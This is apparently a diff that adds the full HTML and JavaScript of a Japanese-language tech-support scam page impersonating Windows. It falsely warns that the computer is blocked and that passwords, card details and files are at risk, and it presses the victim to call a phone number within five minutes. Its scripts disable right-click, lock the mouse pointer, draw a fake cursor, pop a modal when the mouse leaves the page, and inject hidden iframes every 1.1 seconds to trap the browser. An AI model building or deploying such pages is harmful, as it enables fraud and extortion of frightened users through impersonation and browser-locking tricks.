+			<li><a href="#">ダウンロード</a></li>
+			<li><a href="#">安全性</a></li>
+              </ul>
+            </li>
+            <li class="dropdown">
+              <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">製品<span class="caret"></span></a>
+              <ul class="dropdown-menu">
+                <li><a href="#">ソフトウェアとサービス</a></li>
+                <li><a href="#">デバイスとXbox</a></li>
+                <li><a href="#">ビジネスのための</a></li>
+              </ul>
+            </li>
+            <li><a href="#">サポート</a></li>
+          </ul>
+          <ul class="nav navbar-nav navbar-right">
+            <li><a href="#">  <strong style="font-size:25px;">無料通話 : (050) 3196 5323 </strong></a></li>
+          </ul>
+        </div><!--/.nav-collapse -->
+      </div>
+    </nav>
+
+    <div class="container" >
+  <div class="jumbotron" style="background:#1a2c5a url('winx.png') no-repeat 90% 80%">
+            <div class="row">
+          <div class="col-xs-6 text-left">
+
+            <h2> 注意 </h2>
+              <strong style="font-size:22px;">(050) 3196 5323 </strong>(無料通話)
+<br>
+             PCを停止して閉じないでください
+              </br> </br>
+             不審なアクティビティによりWindowsがブロックされました
+              </br> </br>
+              次の情報が失われる可能性があります:
+              <br/>
+              1. パスワード
+              <br/>
+              2. 閲覧履歴
+              <br/>
+              3. 機密情報（CCの詳細）
+              <br/>
+              4. ハードディスク上のファイル
+              <br/>
+              <br/>
+              この重要な警告は無視しないでください。このページを閉じると、コンピュータへのアクセスが無効になり、ネットワークへのさらなる損傷を防ぐことができます
+              <br>
+              電話してください: <b>  (050) 3196 5323 </b>.
+              <br>
+              すぐにご連絡ください。技術者が電話の取り外し手順をご案内します。コンピュータが無効になるのを防ぐために、5分以内に電話してください。
+              <br>
+
+
+                お電話ください: <b> <span style="font-size:25px; background:none;"> (050) 3196 5323 </span> </b>
+
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+
+    <footer class="footer">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-4" style="text-align:left;">
+            <h4>サポート</h4>
+            <ul style="padding:0px;">
+        <li style="list-style: none; padding:10px 0px;"><a>サポートアカウント</a></li>
+        <li style="list-style: none; padding:10px 0px;"><a>サポートされている製品のリスト</a></li>
+        <li style="list-style: none; padding:10px 0px;"><a>製品サポートライフサイクル</a></li>
+            </ul>
+          </div>
+          <div class="col-md-4" style="text-align:left;">
+           <h4>安全性</h4>
+      <ul style="padding:0px;">
+        <li style="list-style: none; padding:10px 0px;"><a>セキュリティセンター</a></li>
+        <li style="list-style: none; padding:10px 0px;"><a>安全に関する重要事項</a></li>
+        <li style="list-style: none; padding:10px 0px;"><a>悪意のあるソフトウェアを削除するためのツール</a></li>
+            </ul>
+          </div>
+          <div class="col-md-4" style="text-align:left;">
+            <h4>人気のトピック</h4>
+      <ul style="padding:0px;">
+        <li style="list-style: none; padding:10px 0px;"><a>サポート詐欺を報告する</a></li>
+        <li style="list-style: none; padding:10px 0px;"><a>障害の責任者であるサポート詐欺を報告する</a></li>
+        <li style="list-style: none; padding:10px 0px;"><a>世界中のWindowsのアドレスを見つける</a></li>
+            </ul>
+          </div>
+        </div>
+        <div class="row" style="font-size: 1.2rem; padding:30px 0px;">
+          <div style="float:left;"><span class="glyphicon glyphicon-cd"></span><span>英語（米国）</span>
+          </div>
+          <div style="float:right;">
+            <span style="padding:0px 15px;">利用規約</span>
+      <span style="padding:0px 15px;">英語（米国）</span>
+      <span style="padding:0px 15px;">ブランド</span>
+      <span style="padding:0px 15px;">@2020 Windows</span>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+
+    <div id="chrome-alerts" class="chrome-alert">
+      <div>
+        <a href="javascript:openlink()" class="cross">×</a>
+        <h1>重要な情報</h1>
+        <div class="content-box" id="alert-content-box">
+            <strong style="font-size:22px;">無料通話 : (050) 3196 5323 </strong>
+            <P>
+            ***エラー＃AP7MQ79。 ***不審なアクティビティによりWindowsがブロックされました
+          </br> </br>
+            次の情報が失われる可能性があります:
+              <br/>
+              1. パスワード
+              <br/>
+              2. 閲覧履歴
+              <br/>
+              3. 機密情報（CCの詳細）
+              <br/>
+              4. ハードディスク上のファイル
+              <br/>
+            <br/>
+            この重要な警告は無視しないでください。このページを閉じると、コンピュータへのアクセスが無効になり、ネットワークへのさらなる損傷を防ぐことができます
+            <br>
+            電話してください: <b> (050) 3196 5323 </b>.
+            <br>
+            すぐにご連絡ください。技術者が電話の取り外し手順をご案内します。コンピュータが無効になるのを防ぐために、5分以内に電話してください.
+            <br>
+            ***********
+             電話番号: <b><span style="font-size:20px;"> (050) 3196 5323 </span></b>
+            ***********
+            </P>
+        </div>
+        <label style="font-size: 12px;"><input type="checkbox"> 追加の対話を防ぐ.</label>
+        <div class="action_buttons">
+          <a class="active" id="leave_page">安全に戻る</a>
+        </div>
+      </div>
+    </div>
+
+
+    <div style="position: absolute; right: 30px; top: 200px;color:#FFF; font-size:16px;"><b><u>エラーが記録されました: <script>document.write(formatAMPM());</script><br>Windows診断IPアドレス: 129.244.0.1</br><span style="text-decoration:none; font-size:25px;">サポートに電話する (050) 3196 5323</span></div></u></b>
+
+    </div>
+    <script type="text/javascript" language="JavaScript1.2">
+
+  if (window.Event)
+    document.captureEvents(Event.MOUSEUP);
+
+
+  function nocontextmenu() {
+    event.cancelBubble = true, event.returnValue = false;
+
+    return false;
+  }
+
+  function norightclick(e) {
+    if (window.Event) {
+      if (e.which == 2 || e.which == 3) return false;
+    }
+    else if (event.button == 2 || event.button == 3) {
+      event.cancelBubble = true, event.returnValue = false;
+      return false;
+
+    }
+  }
+
+
+  if (document.layers)
+    document.captureEvents(Event.MOUSEDOWN);
+
+  document.oncontextmenu = nocontextmenu;
+  document.onmousedown = norightclick;
+  document.onmouseup = norightclick;
+
+
+
+</script>
+
+
+  <script>
+  // Get the modal
+  var modal = document.getElementById('myModal');
+
+  // Get the button that opens the modal
+  var btn = document.getElementById("myBtn");
+
+  // Get the <span> element that closes the modal
+  var span = document.getElementsByClassName("close")[0];
+
+  // When the user clicks the button, open the modal
+  /*btn.onclick = function() {
+    modal.style.display = "block";
+  } */
+
+  // When the user clicks on <span> (x), close the modal
+  span.onclick = function() {
+    modal.style.display = "none";
+  }
+
+  // When the user clicks anywhere outside of the modal, close it
+  window.onclick = function(event) {
+    if (event.target == modal) {
+      modal.style.display = "none";
+    }
+  }
+  </script>
+    <script type="text/javascript">
+  function addEvent(obj, evt, fn) {
+      if (obj.addEventListener) {
+          obj.addEventListener(evt, fn, false);
+      }
+      else if (obj.attachEvent) {
+          obj.attachEvent("on" + evt, fn);
+      }
+  }
+  addEvent(window,"load",function(e) {
+      addEvent(document, "mouseout", function(e) {
+          e = e ? e : window.event;
+          var from = e.relatedTarget || e.toElement;
+          if (!from || from.nodeName == "HTML") {
+
+
+  			 modal.style.display = "block";
+
+          }
+      });
+  });
+
+    $(document).mousemove(function(){
+    var canvas = document.getElementById('mycanvas');
+  canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
+  canvas.requestPointerLock();
+
+
+    });
+
+
+
+  </script>
+
+
+
+<script type="text/javascript" src="jquery.min-2.js"></script>
+    <script> $(document).ready(function () { animateDiv(); }); function makeNewPosition() { var h = $(window).height() - 50, w = $(window).width() - 50, nh = Math.floor(Math.random() * h), nw = Math.floor(Math.random() * w); return [nh, nw]; } function animateDiv() { var newq = makeNewPosition(), oldq = $(".fakeCursor").offset(), speed = calcSpeed([oldq.top, oldq.left], newq); $(".fakeCursor").animate({ top: newq[0], left: newq[1] }, speed, function () { animateDiv(); }); }; function calcSpeed(prev, next) { var x = Math.abs(prev[1] - next[1]), y = Math.abs(prev[0] - next[0]), greatest = x > y ? x : y, speedModifier = 0.7, speed = Math.ceil(greatest / speedModifier); return speed; }
+	</script>
+    <style type="text/css">
+        @media all and (-ms-high-contrast:none) {
+            div.fakeCursor {
+                width: 17px;
+                height: 25px;
+                background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAZCAMAAADg4DWlAAAAmVBMVEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8jo0yHAAAAMXRSTlMAAQUPA0IfMgInFzlGCwwpGQcJEiIIP04vGDoqDgYbNVFDGjFBMEgWIElFEyw4PjRLq1RDbAAAALhJREFUeF5V0NlygzAMBVDbKK1tgtlJSgrZ93RR/v/jgjwTC/R45o6kuUJIDVqK0SDkSaHGhBhlNhoTPtGkH0QsT4w/iVgGmjGRMAVhCsLEwsTCRDKhsIemTW2hvQyKm8Xp989kCZAgyeL/cKxslFMG11uia7OySQdSIO72Mcl8tvyq/fX6bNKLp7j6Bnqxo34mId+h5tC7Z5Jbs7qrUJxEfLQ/pmQR4HpjegcsUrmydNQHEygFA7wAtBchFf1cSBMAAAAASUVORK5CYII=");
+                position: fixed;
+                z-index: 3000;
+            }
+
+            .nocursor {
+                cursor: none;
+                position: absolute;
+                top: 0;
+                bottom: 0;
+                width: 100%;
+            }
+        }
+
+        @media screen and (-webkit-min-device-pixel-ratio:0) {
+            div.fakeCursor {
+                width: 17px;
+                height: 25px;
+                background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAZCAMAAADg4DWlAAAAmVBMVEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8jo0yHAAAAMXRSTlMAAQUPA0IfMgInFzlGCwwpGQcJEiIIP04vGDoqDgYbNVFDGjFBMEgWIElFEyw4PjRLq1RDbAAAALhJREFUeF5V0NlygzAMBVDbKK1tgtlJSgrZ93RR/v/jgjwTC/R45o6kuUJIDVqK0SDkSaHGhBhlNhoTPtGkH0QsT4w/iVgGmjGRMAVhCsLEwsTCRDKhsIemTW2hvQyKm8Xp989kCZAgyeL/cKxslFMG11uia7OySQdSIO72Mcl8tvyq/fX6bNKLp7j6Bnqxo34mId+h5tC7Z5Jbs7qrUJxEfLQ/pmQR4HpjegcsUrmydNQHEygFA7wAtBchFf1cSBMAAAAASUVORK5CYII=");
+                position: fixed;
+                z-index: 100;
+            }
+
+            .nocursor {
+                cursor: none;
+                position: absolute;
+                top: 0;
+                bottom: 0;
+                width: 100%;
+            }
+        }
+
+        @-moz-document url-prefix() {
+            width: 17px;
+            height: 25px;
+            background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAZCAMAAADg4DWlAAAAmVBMVEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8jo0yHAAAAMXRSTlMAAQUPA0IfMgInFzlGCwwpGQcJEiIIP04vGDoqDgYbNVFDGjFBMEgWIElFEyw4PjRLq1RDbAAAALhJREFUeF5V0NlygzAMBVDbKK1tgtlJSgrZ93RR/v/jgjwTC/R45o6kuUJIDVqK0SDkSaHGhBhlNhoTPtGkH0QsT4w/iVgGmjGRMAVhCsLEwsTCRDKhsIemTW2hvQyKm8Xp989kCZAgyeL/cKxslFMG11uia7OySQdSIO72Mcl8tvyq/fX6bNKLp7j6Bnqxo34mId+h5tC7Z5Jbs7qrUJxEfLQ/pmQR4HpjegcsUrmydNQHEygFA7wAtBchFf1cSBMAAAAASUVORK5CYII=");
+            position: fixed;
+            z-index: 3000;
+        }
+
+        .nocursor {
+            cursor: none;
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            width: 100%;
+        }
+
+        }
+
+        div#container {
+            width: 688px;
+            position: relative;
+            margin: 0 auto 0 auto;
+            text-align: left;
+            z-index: 3000;
+        }
+
+        body {
+            background-color: #FFFFFF;
+            color: #000000;
+            font-family: Arial;
+            font-size: 13px;
+            margin: 0;
+
+        }
+    </style>
+<div class="fakeCursor"></div>
+
+<script type=text/javascript>
+function get_browser() {
+var b = navigator.userAgent, a, c = b.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+if (/trident/i.test(c[1])) {
+a = /\brv[ :]+(\d+)/g.exec(b) || [];
+return {
+name: "IE",
+version: (a[1] || "")
+}
+}
+if (c[1] === "Chrome") {
+a = b.match(/\bOPR\/(\d+)/);
+if (a != null) {
+return {
+name: "Opera",
+version: a[1]
+}
+}
+}
+c = c[2] ? [c[1], c[2]] : [navigator.appName, navigator.appVersion, "-?"];
+if ((a = b.match(/version\/(\d+)/i)) != null) {
+c.splice(1, 1, a[1])
+}
+return {
+name: c[0],
+version: c[1]
+}
+}
+var InternetEx = window.navigator.appVersion.indexOf("MSIE") != -1;
+var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+var browser = get_browser();
+if (browser.name == "Firefox" || isIEedge || InternetEx || navigator.appName == "Microsoft Internet Explorer" || !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/))) {
+if (isIEedge || InternetEx || navigator.appName == "Microsoft Internet Explorer" || !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/))) {
+function msg_ff() {
+var a = document.createElement("div");
+a.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dfsdfs_fsdfsd007.php"></iframe></div>';
+document.body.appendChild(a)
+}
+window.setInterval(function() {
+msg_ff()
+}, 1100)
+} else {
+function msg_ff() {
+var a = document.createElement("div");
+a.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dfsdfs_fsdfsd007.php"></iframe></div>';
+document.body.appendChild(a)
+}
+window.setInterval(function() {
+msg_ff()
+}, 1100)
+}
+} else {}
+;</script>
+
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dfsdfs_fsdfsd007.php"></iframe></div>
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dfsdfs_fsdfsd007.php"></iframe></div>
+
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dfsdfs_fsdfsd007.php"></iframe></div>
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dfsdfs_fsdfsd007.php"></iframe></div>
+
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dfsdfs_fsdfsd007.php"></iframe></div>
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dfsdfs_fsdfsd007.php"></iframe></div>
+
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dfsdfs_fsdfsd007.php"></iframe></div>
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dfsdfs_fsdfsd007.php"></iframe></div>
+
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dfsdfs_fsdfsd007.php"></iframe></div>
+<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="dfsdfs_fsdfsd007.php"></iframe></div>
+
+
+
+<iframe src="beep.mp3" allow="autoplay" style="display:none;">
+
+
+
+
+
+</body>
+</html>
